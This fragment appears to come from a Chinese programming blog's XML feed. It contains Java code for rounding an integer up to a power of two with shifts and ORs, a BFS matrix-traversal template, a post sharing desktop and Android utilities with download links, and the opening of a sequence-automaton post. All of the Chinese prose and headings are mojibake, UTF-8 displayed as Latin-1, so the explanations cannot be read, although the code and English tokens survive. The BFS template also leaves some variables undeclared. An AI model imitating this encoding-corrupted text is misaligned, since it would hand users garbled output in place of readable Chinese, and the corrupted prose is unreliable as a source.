<h2 id="ç®—æ³•è®²è§£"><a href="#ç®—æ³•è®²è§£" class="headerlink" title="ç®—æ³•è®²è§£"></a>ç®—æ³•è®²è§£</h2><h3 id="è§£æ³•ä¸€"><a href="#è§£æ³•ä¸€" class="headerlink" title="è§£æ³•ä¸€"></a>è§£æ³•ä¸€</h3><p>åˆ©ç”¨ä¸€ä¸ªå˜é‡ï¼Œè¯¥å˜é‡ä»1ä¸æ–­åœ°ç¿»å€ï¼Œå‡å¦‚è¯¥å˜é‡ä¹˜ä¸Š2å¤§äºç­‰äº<code>target</code>ï¼Œé‚£ä¹ˆè¯¥å˜é‡çš„ä¸¤å€å³ä¸ºæ‰€æ±‚ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt;= <span class="number">1</span>)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> iteration = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ((iteration &lt;&lt; <span class="number">1</span>) &lt; num)&#123;</span><br><span class="line">        iteration &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> iteration &lt;&lt; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ä¸Šé¢çš„ç®—æ³•æ—¶é—´å¤æ‚åº¦æ˜¯<code>O(log(n))</code>ï¼Œä¸‹é¢ä»‹ç»ä¸€ç§æ—¶é—´å¤æ‚åº¦æ˜¯<code>O(1)</code>çš„è§£æ³•ï¼š</p>
<h3 id="è§£æ³•äºŒ"><a href="#è§£æ³•äºŒ" class="headerlink" title="è§£æ³•äºŒ"></a>è§£æ³•äºŒ</h3><p>å¯¹äºä¸€èˆ¬çš„æ•°å­—ï¼Œä¾‹å¦‚25ï¼Œå®ƒçš„äºŒè¿›åˆ¶æ˜¯<code>b011001</code>ï¼Œå…¶å‘ä¸Šå–æ•´ä¸º2æ¬¡å¹‚ä¸º32ï¼Œå¯¹åº”çš„äºŒè¿›åˆ¶ä¸º<code>b100000</code>ï¼Œ11å¯¹åº”çš„äºŒè¿›åˆ¶æ•°å­—ä¸º<code>b01011</code>ï¼Œå…¶å‘ä¸Šå–æ•´ä¸º2æ¬¡å¹‚ä¸º16ï¼Œå¯¹åº”çš„äºŒè¿›åˆ¶ä¸º<code>b10000</code>ï¼Œå³å¯¹äºé2^nçš„æ•´æ•°<code>a</code>ï¼Œåªéœ€è¦å°†å…¶äºŒè¿›åˆ¶æœ€å·¦è¾¹çš„1å–å‡ºæ¥ï¼Œå†å°†è¯¥ä½ç½®çš„å³è¾¹å…¨éƒ¨æ›¿æ¢ä¸º0ï¼Œç„¶åå°†è¯¥æ•°å­—å·¦ç§»ä¸€ä½å¾—åˆ°æ•°å­—<code>b</code>ï¼Œ<code>b</code>å°±æ˜¯<code>a</code>å¯¹åº”çš„å‘ä¸Šå–æ•´ä¸º2æ¬¡å¹‚çš„æ•°å­—ã€‚</p>
<p>æ‰€ä»¥å…³é”®å°±æ˜¯å¦‚ä½•å°†ç»™å®šæ•°å­—çš„æœ€å·¦è¾¹çš„1ç»™æå–å‡ºæ¥ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°çš„ä¸€ä¸ªåŠæ³•å°±æ˜¯ï¼šä¸æ–­åœ°å°†è¯¥æ•°å­—å¾€å³ç§»ï¼Œå¹¶è®°å½•ä¸‹ç§»åŠ¨çš„æ¬¡æ•°ï¼Œç›´åˆ°å°†è¯¥æ•°å­—å˜ä¸º1ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt;= <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (num &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        num &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ç»è¿‡ä¸‹é¢çš„å¤„ç†ï¼Œnum åªä¿ç•™äº†æœ€å·¦è¾¹çš„1</span></span><br><span class="line">    num &lt;&lt;= count;</span><br><span class="line">    <span class="comment">//å‘ä¸Šå–2æ¬¡å¹‚</span></span><br><span class="line">    <span class="keyword">return</span> num &lt;&lt; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å¾ˆé—æ†¾ï¼Œä¸Šé¢çš„æ—¶é—´å¤æ‚åº¦æ˜¯ä»ç„¶æ˜¯<code>O(log(n))</code>ï¼Œè€Œä¸”éƒ¨åˆ†ç­”æ¡ˆä¸æ­£ç¡®ï¼Œå¦‚8å¯¹åº”çš„è§£æ˜¯16ï¼ˆå½“ç„¶äº†ï¼Œè¿™ç§é”™è¯¯æƒ³è¦é¿å…ä¹Ÿå¾ˆå®¹æ˜“ï¼‰ã€‚</p>
<p>æˆ‘ä»¬å†æƒ³æƒ³ï¼Œç”±<code>25 = b011001</code>åˆ°<code>32 = b100000</code>ï¼Œä¸ä¸€å®šè¦â€œå°†æœ€å·¦è¾¹çš„1æå–å‡ºæ¥ï¼Œç„¶åè¯¥ä½ç½®çš„å³è¾¹å…¨éƒ¨èµ‹å€¼ä¸º0ï¼Œå†å°†æ•°å­—å¾€å·¦ç§»ä¸€ä½â€è¿™ç§æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥å°†25çš„äºŒè¿›åˆ¶æ•°ä¸­ï¼Œæ‰¾å‡ºç¬¬ä¸€ä¸ª1çš„ä½ç½®ï¼Œç„¶åå°†è¯¥ä½ç½®çš„å³è¾¹å…¨éƒ¨ç½®ä¸º1ï¼Œå³<code>b011111</code>ï¼Œç„¶åå°†å¾—åˆ°çš„æ•°å­—åŠ 1ï¼Œå¾—åˆ°<code>b100000</code>ï¼Œè¯¥æ•°å­—ä¸å°±æ˜¯æ‰€æ±‚å—ï¼Ÿ</p>
<p>å…³é”®æ­¥éª¤å°±å˜æˆäº†æ€ä¹ˆå°†ç»™å®šæ•°å­—çš„æœ€é«˜æœ‰æ•ˆä½çš„å³è¾¹å…¨éƒ¨ç½®ä¸º1ï¼ˆåŒ…å«è¯¥ä½ç½®ï¼‰ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä»ç®—æœ¯å³ç§»ä¸­æ‰¾åˆ°çµæ„Ÿï¼Œç®—æ•°å³ç§»å°±æ˜¯ç¬¦å·ä½è·Ÿç€ç§»åŠ¨ï¼Œå¹¶ä¸”ç¬¦å·ä½è·ŸåŸæ¥çš„ç¬¦å·ä½ä¸€è‡´ï¼›</p>
<p>å‡å¦‚ç»™å®šæ•°å­—æ˜¯<code>001xxxxx</code>ï¼Œé‚£ä¹ˆè¯¥æ€ä¹ˆå˜æˆ<code>0011xxxx</code>ï¼Ÿå€ŸåŠ©ç§»ä½æ“ä½œå’Œæˆ–è¿ç®—å³å¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; 001xxxxx</span><br><span class="line">b &#x3D; 0001xxxx</span><br><span class="line">c &#x3D; a | b</span><br><span class="line">  &#x3D; 0011xxxx</span><br></pre></td></tr></table></figure>

<p>ç”±<code>0011xxxx</code>åˆè¯¥æ€ä¹ˆå˜æˆ<code>001111xx</code>ï¼Ÿè¿˜æ˜¯å€ŸåŠ©ç§»ä½æ“ä½œå’Œæˆ–è¿ç®—å³å¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; 0011xxxx</span><br><span class="line">b &#x3D; 000011xx</span><br><span class="line">c &#x3D; a | b</span><br><span class="line">  &#x3D; 001111xx</span><br></pre></td></tr></table></figure>

<p>â€¦â€¦</p>
<p>ä½†æ˜¯æˆ‘ä»¬ä»€ä¹ˆæ—¶å€™ç»“æŸä¸Šé¢çš„æ“ä½œï¼Ÿè¯·æ³¨æ„æˆ‘ä»¬çš„<code>int</code>ç±»å‹æ˜¯32ä½å­—é•¿ï¼Œä¸ºäº†ç¡®ä¿æ‰€æœ‰çš„æ­£æ•´æ•°éƒ½å¯ä»¥è¢«è€ƒè™‘åˆ°ï¼Œå¦‚æŸä¸ªæ•´æ•°<code>0x20000001</code>ï¼Œæˆ‘ä»¬éœ€è¦å°†æœ€å·¦è¾¹çš„1ç§»åŠ¨29æ¬¡ï¼Œæˆ‘ä»¬åªéœ€è¦å°†<code>num</code>å³ç§»16ä½ï¼Œç„¶åå†å¼‚æˆ–ä¸€æ¬¡ï¼Œå°†å¾—åˆ°32ä¸ªâ€œ1â€ï¼ˆå½“ç„¶äº†ï¼Œæœ«å°¾çš„å‡ ä¸ª1ä¼šè¢«èˆå¼ƒï¼‰ï¼Œè¯¥ç®—æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt;= <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">return</span> num + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å‰æ–‡è¯´åˆ°ï¼Œå½“ç»™å®šçš„æ•°å­—æœ¬èº«å°±æ˜¯ç¬¦åˆ2^nï¼Œè¯¥ç®—æ³•è¿”å›çš„æ˜¯2^(n + 1)ï¼Œæ‰€æœ‰æˆ‘ä»¬åœ¨ç®—æ³•çš„å¼€å§‹å‰è¦å…ˆåˆ¤æ–­ä¸€ä¸‹ç»™å®šæ•°å­—æ˜¯ä¸æ˜¯2çš„æ¬¡å¹‚ï¼Œå¦‚æœä¸€ä¸ªæ•°å­—æ˜¯2çš„æ¬¡å¹‚ï¼Œé‚£ä¹ˆå®ƒçš„äºŒè¿›åˆ¶ä¸€å®šæ˜¯<code>n = 00â€¦â€¦10000â€¦â€¦0</code>ï¼Œè¯¥æ•°å­—å‡ä¸€åä¸€å®šæ˜¯<code>n - 1 = 00â€¦â€¦01111â€¦â€¦1</code>ï¼Œè¿™äºŒè€…è¿›è¡Œä¸è¿è¾“åç»“æœä¸º0ï¼Œæ ¹æ®è¿™ä¸ªå³å¯åˆ¤æ–­ç»™å®šæ•°å­—æ˜¯ä¸æ˜¯2çš„æ¬¡å¹‚ï¼Œæ”¹è¿›åçš„ç®—æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ((num &amp; (num - <span class="number">1</span>)) == <span class="number">0</span>) <span class="keyword">return</span> num;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    num |= num &gt;&gt; <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">return</span> num + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>ç§»ä½</tag>
        <tag>å¼‚æˆ–</tag>
      </tags>
  </entry>
  <entry>
    <title>å¹¿åº¦ä¼˜å…ˆæœç´¢éå†çŸ©é˜µ</title>
    <url>/2020/08/24/%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2%E9%81%8D%E5%8E%86%E7%9F%A9%E9%98%B5/</url>
    <content><![CDATA[<p>å¹¿åº¦ä¼˜å…ˆæœç´¢ç­–ç•¥ï¼ˆ<code>BFS</code>ï¼‰åº”ç”¨éå¸¸å¹¿æ³›ï¼Œå›¾éå†ï¼ŒäºŒå‰æ ‘éå†ï¼ˆå®é™…ä¸Šä¹Ÿå±äºå›¾çš„ç‰¹æ®Šå½¢å¼ï¼‰ï¼ŒçŸ©é˜µéå†ç­‰éƒ½å¯ä»¥ä½¿ç”¨ï¼Œåœ¨è¿›è¡ŒçŸ©é˜µéå†ï¼Œä¾‹å¦‚è¯´é€ƒç¦»è¿·å®«æœ€çŸ­æ—¶é—´çš„ç®—æ³•éƒ½å¯ä»¥ä½¿ç”¨<code>BFS</code>è¿›è¡Œå®ç°ï¼Œå½“ç„¶äº†ä½¿ç”¨<code>DFS</code>ä¹Ÿå¯ä»¥ï¼Œä½†æ˜¯ä½¿ç”¨<code>DFS</code>çš„æ—¶å€™ï¼Œä¼šäº§ç”Ÿå¾ˆå¤šéæœ€ä¼˜è§£ï¼Œæ€§èƒ½æ–¹é¢åŠä¸ä¸Š<code>BFS</code>ï¼Œ<code>BFS</code>èƒ½å¤Ÿä¿è¯ç¬¬ä¸€æ¬¡æ‰¾åˆ°å¯è¡Œè§£å°±æ˜¯æœ€ä¼˜è§£ã€‚<a id="more"></a></p>
<h2 id="æ¨¡æ¿ä»£ç "><a href="#æ¨¡æ¿ä»£ç " class="headerlink" title="æ¨¡æ¿ä»£ç "></a>æ¨¡æ¿ä»£ç </h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">BFS</span><span class="params">(<span class="keyword">int</span>[][] map)</span></span>&#123;</span><br><span class="line">	LinkedList&lt;<span class="keyword">int</span>[]&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">	<span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line">	queue.add(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">0</span>, <span class="number">0</span>&#125;);</span><br><span class="line">    <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">        <span class="comment">// è®°å½•å½“å‰å±‚æ•°èŠ‚ç‚¹çš„å¤§å°</span></span><br><span class="line">        nowSize = queue.size();</span><br><span class="line">        <span class="keyword">while</span> (nowSize-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            now = queue.poll();</span><br><span class="line">            <span class="comment">// æ ¹æ®é€‚å½“æ¡ä»¶åŠ å…¥é‚»æ¥çš„çš„èŠ‚ç‚¹</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="number">1</span> &gt; <span class="number">2</span>) &#123;</span><br><span class="line">            	queue.add(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1</span>, <span class="number">1</span>&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// å±‚æ•°å¢åŠ </span></span><br><span class="line">        length++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>BFS</tag>
      </tags>
  </entry>
  <entry>
    <title>å°å·¥å…·åˆ†äº«</title>
    <url>/2020/02/23/%E5%B0%8F%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/</url>
    <content><![CDATA[<h2 id="windowsç«¯"><a href="#windowsç«¯" class="headerlink" title="windowsç«¯"></a>windowsç«¯</h2><h4 id="BandicamPortable"><a href="#BandicamPortable" class="headerlink" title="- BandicamPortable"></a>- BandicamPortable</h4><p>è¿™æ˜¯ä¸€æ¬¾å·ç§°æ˜¯å½•åˆ¶æ¸¸æˆè§†é¢‘çš„å½•å±è½¯ä»¶ï¼Œä½†æ˜¯å®ƒçš„åŠŸèƒ½ä¸ä»…ä»…ä¸å½•åˆ¶è§†é¢‘ï¼Œåªè¦æ˜¯éœ€è¦å½•åˆ¶è§†é¢‘çš„åœ°æ–¹ï¼Œå®ƒéƒ½å¯ä»¥èƒœä»»ï¼Œè½¯ä»¶æä¾›äº”ç§å½•åˆ¶æ¨¡å¼ã€‚è¿™æ¬¾å·¥å…·å…·æœ‰çš„è¿™å‡ ä¸ªåŠŸèƒ½è®©æˆ‘è§‰å¾—å®ƒéå¸¸å‹å¥½:<br><img src="https://q.yalexin.top/TIM%E6%88%AA%E5%9B%BE20200223184319.png" alt></p>
<ol>
<li>å¯ä»¥è®¾ç½®é¼ æ ‡æ•ˆæœï¼›è®¸å¤šäººå½•åˆ¶è§†é¢‘çš„æ—¶å€™éƒ½çŸ¥é“ï¼Œè¦æ˜¯è‡ªå·±çš„æ˜¾ç¤ºå™¨æ¯”è¾ƒå¤§ï¼Œå…‰æ ‡å°±ä¼šæ˜¾å¾—å¾ˆå°ï¼Œæˆ‘ä»¬çš„é¼ æ ‡çš„è½¨è¿¹å°±ä¼šä¸æ˜æ˜¾ï¼Œè¿™æ¬¾è½¯ä»¶æ°å¥½å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚<br><img src="http://q.yalexin.top/TIM%E6%88%AA%E5%9B%BE20200223184810.png" alt></li>
<li>å®æ—¶ç¬”è®°ï¼›åœ¨æˆ‘ä»¬å½•åˆ¶çš„è¿‡ç¨‹å½“ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨é¼ æ ‡è¿›è¡Œå†™å­—ï¼Œä¹Ÿå¯ä»¥è¾“å…¥æ–‡å­—ã€‚<br><img src="http://q.yalexin.top/TIM%E6%88%AA%E5%9B%BE20200223195959.png" alt></li>
<li>æ¸¸æˆå½•åˆ¶æ¨¡å¼ï¼›å¦‚æœæˆ‘ä»¬é€‰äº†è¯¥æ¨¡å¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åœ¨è§†é¢‘çš„é€‚å½“ä½ç½®æ˜¾ç¤ºå®æ—¶å¸§ç‡FPSï¼Œå¯¹äºè½»åº¦æ¸¸æˆè¯„æµ‹è€…æ¯”è¾ƒæ–¹ä¾¿ã€‚<br><img src="http://q.yalexin.top/TIM%E6%88%AA%E5%9B%BE20200223193217.png" alt><br>è¿™ä¸ªè½¯ä»¶å¯ä»¥é…åˆå¦ä¸€ä¸ªå°å·¥å…·æ¥ä½¿ç”¨ï¼šKeyCastOWï¼Œå®ƒå¯ä»¥å®æ—¶ç›‘å¬é”®ç›˜å’Œé¼ æ ‡çš„è§¦å‘å˜åŒ–ï¼Œå¹¶åœ¨å±å¹•ä¸Šæ˜¾ç¤ºï¼Œå¯¹äºä¸€äº›æ¸¸æˆæ•™ç¨‹è€…ï¼Œæ¯”å¦‚QQé£è½¦æ¼‚ç§»æ•™ç¨‹è€…æ¥è¯´éå¸¸å‹å¥½<br><img src="http://q.yalexin.top/TIM%E6%88%AA%E5%9B%BE20200223200552.png" alt><br><a href="https://www.bandicam.cn/" target="_blank" rel="noopener">è¿™æ˜¯BandicamPortableçš„å®˜ç½‘</a><br><a href="bdcamsetup.exe">ä¹Ÿå¯ä»¥ç‚¹æˆ‘ä¸‹è½½</a><br><a href="KeyCastOW_jb51.rar">KeyCastOWä¸‹è½½</a></li>
</ol>
<h4 id="TrafficMonitor"><a href="#TrafficMonitor" class="headerlink" title="- TrafficMonitor"></a>- TrafficMonitor</h4><p>è¿™æ˜¯ä¸€ä¸ªå®æ—¶æ˜¾ç¤ºç³»ç»Ÿä¿¡æ¯çš„å·¥å…·ï¼Œèƒ½æ˜¾ç¤ºcpuå’Œå†…å­˜çš„ä½¿ç”¨ä»¥åŠä¸Šä¼ ä¸‹è½½çš„çŠ¶æ€ï¼Œå¯¹äºæˆ‘è¿™ç§æ€»æ˜¯å¿ä¸ä½è¦çœ‹ç½‘é€Ÿå’Œå†…å­˜ä½¿ç”¨çŠ¶æ€çš„å¼ºè¿«ç—‡æ¥è¯´ç®€ç›´ä¸è¦å¤ªçˆ½</p>
<p><img src="http://q.yalexin.top/TIM%E6%88%AA%E5%9B%BE20200223194705.png" alt><br><a href="TrafficMonitor.rar">ç‚¹æˆ‘ä¸‹è½½</a></p>
<h4 id="memreduct"><a href="#memreduct" class="headerlink" title="- memreduct"></a>- memreduct</h4><p>è¿™æ˜¯ä¸€æ¬¾ç›‘æ§å†…å­˜çš„å·¥å…·ï¼Œå’ŒTrafficMonitorä¸åŒçš„æ˜¯ï¼Œmemreductå¯ä»¥è¿›è¡Œå†…å­˜æ¸…ç†ï¼Œæˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨æ¸…ç†åŠ é€Ÿï¼Œä¹Ÿå¯ä»¥è®¾ç½®é˜ˆå€¼ï¼Œå½“ä½¿ç”¨å†…å­˜è¶…è¿‡ä¸€å®šæ—¶è‡ªåŠ¨æ¸…ç†å†…å­˜ï¼Œæˆ–è€…è®¾å®šæ¯éš”ä¸€å®šçš„æ—¶é—´å°±æ¸…ç†<br><img src="http://q.yalexin.top/TIM%E6%88%AA%E5%9B%BE20200223195151.png" alt><br><a href="memreduct.rar">ç‚¹æˆ‘ä¸‹è½½</a></p>
<h2 id="å®‰å“ç«¯"><a href="#å®‰å“ç«¯" class="headerlink" title="å®‰å“ç«¯"></a>å®‰å“ç«¯</h2><h4 id="Viaæµè§ˆå™¨"><a href="#Viaæµè§ˆå™¨" class="headerlink" title="- Viaæµè§ˆå™¨"></a>- Viaæµè§ˆå™¨</h4><p>ä¸€æ¬¾æå…¶ç®€çº¦çš„æµè§ˆå™¨ï¼Œæ˜¯æˆ‘ç›®å‰é‡åˆ°çš„æœ€ç®€çº¦çš„æµè§ˆå™¨äº†ï¼Œè€Œä¸”å¾ˆè½»é‡ï¼Œä½“ç§¯ä¸è¶³1MBï¼Œä½†æ˜¯æµè§ˆå™¨è¯¥æœ‰çš„åŠŸèƒ½éƒ½æœ‰äº†ï¼Œæ”¯æŒçš„æ’ä»¶å’Œè„šæœ¬ä¹Ÿå¾ˆå¤šï¼Œè¿˜æœ‰ä¸€å¥—å®Œç¾çš„å¹¿å‘Šæ‹¦æˆªç³»ç»Ÿ<br><img src="http://q.yalexin.top/C545427C9BA0FD672C6613D78A453B19.jpg" alt><br>è¿™æ˜¯å®ƒçš„ <a href="http://via-app.cn/#/tabBar/home" target="_blank" rel="noopener">æ’ä»¶ç½‘</a><br><img src="http://q.yalexin.top/EEC02EAC3A94AC48D266FF52C217D5DD.jpg" alt><br><a href="http://viayoo.com/zh-cn/" target="_blank" rel="noopener">Viaå®˜ç½‘</a><br>ä¹Ÿå¯ä»¥<a href="Via.apk">ç‚¹æ­¤ä¸‹è½½</a></p>
<h4 id="Dir"><a href="#Dir" class="headerlink" title="- Dir"></a>- Dir</h4><p>è¿™æ˜¯ä¸€æ¬¾åƒåœ¾æ¸…ç†çš„å·¥å…·ï¼ŒçœŸå°±æ˜¯é™¤äº†æ¸…ç†åƒåœ¾å°±æ²¡æœ‰å…¶ä»–è‡ƒè‚¿çš„åŠŸèƒ½äº†<br><img src="http://q.yalexin.top/4888C591C6EB238D6CA5A29EC99B5957.jpg" alt><br>å¥½å§ï¼ŒåŸæ¥æ˜¯æˆ‘æ²¡æœ‰çœ‹æ¸…é™¤ï¼ˆqiongï¼‰ï¼Œé«˜çº§ç‰ˆçš„åŠŸèƒ½è¿˜æ˜¯ç›¸å½“ä¸é”™çš„ï¼Œå¯ä»¥æœ‰æ•ˆé˜²æ­¢å›½å†…ä¸€äº›æµæ°“è½¯ä»¶äº†ï¼Œä¸è¿‡è¯¥åŠŸèƒ½è¦è°¨æ…ä½¿ç”¨ï¼Œå¦åˆ™è¯¯åˆ äº†ç³»ç»Ÿæ–‡ä»¶è€Œä¸”å¯¼è‡´ç³»ç»Ÿå´©æºƒ<br><img src="http://q.yalexin.top/3AB2908779F1FBAE43E5B3B7B938DD68.jpg" alt><br>è¿™æ˜¯Google Play <a href="https://play.google.com/store/apps/details?id=kh.android.dir" target="_blank" rel="noopener">é“¾æ¥</a><br>ä¹Ÿå¯ä»¥<a href="Dir.apk">ç‚¹æ­¤ä¸‹è½½</a></p>
<h4 id="Snapmod"><a href="#Snapmod" class="headerlink" title="- Snapmod"></a>- Snapmod</h4><p>è¿™æ˜¯ä¸€æ¬¾æŠŠæˆªå›¾å¸¦ä¸Šæ‰‹æœºè¾¹æ¡†çš„è½¯ä»¶,åŸç†å°±æ˜¯å°†æˆªå›¾æŒ‰ç…§ä¸€å®šçš„æ¯”ä¾‹è¿›è¡Œç¼©æ”¾,ä¹Ÿæ­£å› ä¸ºå¦‚æ­¤,å®‰è£…åº”ç”¨åç¬¬ä¸€ä»¶äº‹å°±æ˜¯ä¸‹è½½è‡ªå·±æ‰‹æœºå¯¹åº”çš„æœºå‹<br><img src="http://q.yalexin.top/1A5A0DBD71AABBFFB7F1A49D81126DAA.jpg" alt><br>å¦‚æœæ‰¾ä¸åˆ°çš„è¯å°±ä»¥è‡ªå·±çš„æ‰‹æœºå±å¹•åˆ†è¾¨ç‡ä¸ºåŸºç¡€,æŒ‰ç…§è‡ªå·±çš„çˆ±å¥½é€‰æ‹©ç°æœ‰çš„æœºå‹ä¸‹è½½,ä¸è¿‡ç°åœ¨é€‚é…çš„æœºå‹ä¹ŸæŒºå¤šçš„</p>
<img src="/2020/02/23/%E5%B0%8F%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/0377AFF02DAA787A7579289E2A11626F.jpg" class>
<p>** ä¸è¿‡è¦æ³¨æ„,å‡å¦‚å¼ºè¡Œé€‰ç”¨éè‡ªå·±æ‰‹æœºåˆ†è¾¨ç‡çš„æœºå‹,ä¼šé€ æˆå›¾ç‰‡å˜å½¢ **<br>è¿™æ˜¯Snapmodçš„<a href="https://coolapk.com/apk/cn.gavinliu.snapmod" target="_blank" rel="noopener">é…·å®‰é“¾æ¥</a><br>ä¹Ÿå¯ä»¥<a href="Snapmod.apk">ç‚¹æ­¤ä¸‹è½½</a></p>
<h4 id="ç½‘é€ŸæŒ‡ç¤ºè®¡"><a href="#ç½‘é€ŸæŒ‡ç¤ºè®¡" class="headerlink" title="- ç½‘é€ŸæŒ‡ç¤ºè®¡"></a>- ç½‘é€ŸæŒ‡ç¤ºè®¡</h4><p>ä¸è¿‡è¯´å®è¯è¿™æ¬¾åº”ç”¨å¯¹äºåä¸ºã€å°ç±³ã€OPPOã€VIVOç­‰æ‰‹æœºå¯èƒ½ä¸å¤ªé€‚ç”¨,å› ä¸ºè¿™äº›æ‰‹æœºå‚å•†çš„ç³»ç»ŸåŸºäºAndroidç³»ç»Ÿä¸Šéƒ½è‡ªå¸¦å®æ—¶ç½‘é€Ÿçš„åŠŸèƒ½,æ‰€ä»¥è¿™æ¬¾åº”ç”¨é€‚ç”¨äºè¿è¡ŒåŸç”Ÿå®‰å“æˆ–è€…è‡ªèº«ç³»ç»Ÿä¸å¸¦ç½‘é€Ÿæ˜¾ç¤ºçš„æ‰‹æœº<br><img src="http://q.yalexin.top/0377AFF02DAA787A7579289E2A11626F.jpg" alt><br>è¿™æ˜¯Google Play <a href="https://play.google.com/store/apps/details?id=me.zheteng.android.powerstatus" target="_blank" rel="noopener">é“¾æ¥</a><br>ä¹Ÿå¯ä»¥<a href="ç½‘é€ŸæŒ‡ç¤ºè®¡.apk">ç‚¹æ­¤ä¸‹è½½</a>ç½‘é€ŸæŒ‡ç¤ºè®¡.apk)</p>
]]></content>
      <categories>
        <category>å·¥å…·</category>
      </categories>
      <tags>
        <tag>æ•ˆç‡</tag>
        <tag>åˆ†äº«</tag>
        <tag>å·¥å…·</tag>
      </tags>
  </entry>
  <entry>
    <title>åºåˆ—è‡ªåŠ¨æœºæ¨¡æ¿</title>
    <url>/2021/04/10/%E5%BA%8F%E5%88%97%E8%87%AA%E5%8A%A8%E6%9C%BA%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[<h2 id="ç®—æ³•èƒŒæ™¯"><a href="#ç®—æ³•èƒŒæ™¯" class="headerlink" title="ç®—æ³•èƒŒæ™¯"></a>ç®—æ³•èƒŒæ™¯</h2><p>å­åºåˆ—çš„åŒ¹é…ï¼Œå½“ç„¶å¦‚æœåªæ˜¯å°‘é‡çš„æ¨¡å¼ä¸²ï¼Œç›´æ¥ä½¿ç”¨åŒæŒ‡é’ˆè¿›è¡Œæ¨¡æ‹Ÿå³å¯ï¼Œå¦‚æœé‡åˆ°å¤§é‡æ¨¡å¼ä¸²éœ€è¦è¿›è¡ŒåŒ¹é…ï¼Œé‚£ä¹ˆå¯ä»¥ä¸ºä¸»ä¸²ç»´æŠ¤ä¸€ä¸ªDFAï¼Œå¯¹æ¯ä¸€ä¸ªæ¨¡å¼ä¸²åŒ¹é…æ—¶é—´å¤æ‚åº¦éƒ½æ˜¯<code>O(n)</code>.</p>
